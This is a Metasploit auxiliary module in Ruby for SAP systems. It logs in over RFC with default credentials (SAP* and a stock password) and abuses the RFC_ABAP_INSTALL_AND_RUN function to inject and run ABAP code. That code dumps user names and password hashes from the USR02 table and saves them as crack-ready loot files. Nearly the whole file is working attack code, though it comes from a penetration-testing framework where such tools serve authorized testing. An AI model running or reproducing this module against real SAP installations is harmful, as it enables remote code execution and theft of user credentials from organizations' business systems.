##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'rubygems'
begin
  require 'nwrfc'
rescue LoadError
  abort("[-] This module requires the NW RFC SDK ruby wrapper (http://rubygems.org/gems/nwrfc) from Martin Ceronio.")
end

class Metasploit4 < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include NWRFC

  def initialize
    super(
      'Name' => 'SAP RFC RFC_ABAP_INSTALL_AND_RUN USR02 Data Dump',
      'Description' => %q{
          This module makes use of the RFC_ABAP_INSTALL_AND_RUN Remote Function Call (RFC)
          to extract SAP user hashes from USR02. The FM (Function Module) RFC_ABAP_INSTALL_AND_RUN 
          takes ABAP source lines and executes them. It is common for the the function to be disabled
          or access revoked in a production system. It is also deprecated. 
          The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc). 
          },                      
      'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Author' => [ 'nmonkee' ],
      'License' => MSF_LICENSE
      )

    register_options(
      [
        Opt::RPORT(3300),
        OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
        OptString.new('SRPORT', [false, 'SAP Router Port Number', nil]),
        OptString.new('CLIENT', [true, 'SAP client', '001']),
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992'])
        ], self.class)
  end

  def run_host(ip)
    rport = datastore['rport'].to_s.split('')
    sysnr = rport[2]
    sysnr << rport[3]
    conn = auth(ip,datastore['rport'],sysnr)
    exec(ip,datastore['rport'],conn)
  end

  def auth(ip,rport,sysnr)
    ashost = ip
    ashost = "/H/#{datastore['SRHOST']}/H/#{ip}" if datastore['SRHOST']
    auth_hash = {"user" => datastore['USERNAME'], "passwd" => datastore['PASSWORD'], "client" => datastore['CLIENT'], "ashost" => ashost, "sysnr" => sysnr}
    begin
      conn = Connection.new(auth_hash)
      return conn
    rescue NWError => e
      case e.message.to_s
      when /Name or password is incorrect/
        print_error("[SAP] #{ip}:#{rport} - login failed}") 
      when /not available in this system/
        print_error("[SAP] #{ip}:#{rport} - client #{client} does not exist")
      when /Connection refused/
        print_error("[SAP] #{ip}:#{rport} - communication failure (refused)")
      when /No route to host/
        print_error("[SAP] #{ip}:#{rport} - communication failure (unreachable)")
      when /unknown/
        print_error("[SAP] #{ip}:#{rport} - communication failure (hostname unknown)")
      when /Password logon no longer possible - too many failed attempts/
        print_error("[SAP] #{ip}:#{rport} - user locked")
      when /Password must be changed/
        print_error("[SAP] #{ip}:#{rport} - password must be changed")
      end
    end
  end

  def exec(ip,rport,conn)
    begin
      conn_info = conn.connection_info
      function = conn.get_function("RFC_ABAP_INSTALL_AND_RUN")
      fc = function.get_function_call
      code = "REPORT EXTRACT LINE-SIZE 255 NO STANDARD PAGE HEADING." + "\r\n"
      code << "DATA: MANDT(3), BNAME(12), BCODE TYPE XUCODE, PASSC TYPE PWD_SHA1." + "\r\n"
      code << "EXEC SQL PERFORMING loop_output." + "\r\n"
      code << "SELECT MANDT, BNAME, BCODE, PASSCODE INTO :MANDT, :BNAME, :BCODE, :PASSC" + "\r\n"
      code << "FROM USR02" + "\r\n"
      code << "ENDEXEC." + "\r\n"
      code << "FORM loop_output." + "\r\n"
      code << "WRITE: / MANDT, BNAME, BCODE, PASSC." + "\r\n"
      code << "ENDFORM." + "\r\n"
      code.split($/).each {|line|
        fc[:PROGRAM].new_row {|row| row[:LINE] = line.strip}
      }
      fc.invoke
      conn.disconnect
    rescue NWError => e
      print_error("[SAP] #{ip}:#{rport} - FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
      fail_with(Exploit::Failure::Unknown, "[SAP] #{ip}:#{rport} - Error executing ABAP")
      return
    end
    saptbl = Msf::Ui::Console::Table.new(
      Msf::Ui::Console::Table::Style::Default,
      'Header'  => "[SAP] Users and hashes",
      'Prefix'  => "\n",
      'Postfix' => "\n",
      'Indent'  => 1,
      'Columns' =>
        [
          "MANDT",
          "BNAME",
          "BCODE",
          "PASSCODE"
          ])
    codevnB = ""
    codevnG = ""
    fc[:WRITES].each {|row|
      string = ""
      array = row[:ZEILE].split(/ /)
      array_length = array.size
      for i in 0...array_length
        if array[i] == ""
        else
          string << ",#{array[i]}"
        end
      end
      str_array = string.split(/,/)
      saptbl << [ str_array[1], str_array[2], str_array[3], str_array[4] ]
      codevnB << str_array[2] + ":" + str_array[2] + " " * (40-str_array[3].length) + "$" + str_array[3] + "\r\n"
      codevnG << str_array[2] + ":" + str_array[2] + " " * (40-str_array[3].length) + "$" + str_array[4] + "\r\n"
      }
    print(saptbl.to_s)
    this_service = report_service(
      :host  => ip,
      :port => rport,
      :name => 'sap',
      :proto => 'tcp'
      )
    loot_path = store_loot("sap.codevnB.hashes", "text/plain", ip, codevnB, "#{ip}", "SAP codevnB Hashes", this_service)
    print_good("[SAP] #{ip}:#{rport} - codevnB hashes stored in #{loot_path}")
    loot_path = store_loot("sap.codevnG.hashes", "text/plain", ip, codevnG, "#{ip}", "SAP codevnG Hashes", this_service)
    print_good("[SAP] #{ip}:#{rport} - codevnG hashes stored in #{loot_path}")
  end
end

